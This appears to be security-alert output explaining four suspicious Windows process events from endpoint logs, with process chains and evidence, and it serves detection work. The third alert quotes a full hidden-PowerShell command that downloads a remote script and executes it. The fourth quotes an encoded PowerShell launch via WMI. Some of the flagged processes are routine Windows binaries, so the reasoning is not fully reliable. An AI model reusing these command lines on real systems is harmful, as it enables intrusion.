explanation:
Attack: A new process, rdpclip.exe, was executed with sysadmin privileges following suspicious network connections and a remote logon.
Why this event: The execution of rdpclip.exe as sysadmin is anomalous as it is a new process for this machine and is associated with a remote logon.
Chain: svchost.exe -> rdpclip.exe (new process)
Evidence: svchost.exe connected to 10.20.5.191:59619, 10.50.2.101:59619, 10.20.5.191:60787, 10.50.2.101:60787, and accepted a connection from 10.103.123.250:54756. A network logon by sysadmin (domain SYSTEMIA.COM) from 10.103.123.250 occurred at 13:47:20.

Attack: A new process gpscript.exe was executed with sysadmin privileges, indicating potential malicious activity.
Why this event: The execution of a new process with sysadmin privileges is suspicious, especially given the context of recent activity.
Chain: svchost.exe -> gpscript.exe /RefreshSystemParam
Evidence: At 13:48:21, gpscript.exe was launched by svchost.exe with the command line /RefreshSystemParam. This follows several other suspicious process starts by svchost.exe, including cmd.exe running scripts like "murder_onedrive.bat".

Attack: A malicious script was downloaded and executed via a Word document macro.
Why this event: The execution of a command prompt spawning PowerShell to download and execute a remote script is indicative of post-exploitation activity.
Chain: outlook.exe -> winword.exe -> cmd.exe -> powershell.exe -> conhost.exe
Evidence: winword.exe started by outlook.exe at 10:22:23; cmd.exe started by winword.exe at 10:39:40 with command line: C:\Windows\System32\cmd.exe /k powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('http://news.com:8000/default.ps1');powershell -noP -sta -w 1 -enc $e; powershell.exe wrote C:\Users\rsantilli\AppData\Local\Temp\__PSScriptPolicyTest_jfqexakd.fgs.ps1 at 10:39:43.

Attack: Remote execution of a base64 encoded PowerShell command via WMI.
Why this event: The execution of a newly spawned PowerShell process with an encoded command, initiated by wmiprvse.exe, is highly suspicious.
Chain: wmiprvse.exe -> powershell.exe -> conhost.exe (started by powershell.exe).
Evidence: On 2000-03-14 14:44:54, powershell.exe was launched with the command line: C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAcwBJAE8ATgBUAEEAQgBMA… The decoded command attempts to retrieve cached Group Policy settings. After the alert, powershell.exe started conhost.exe.
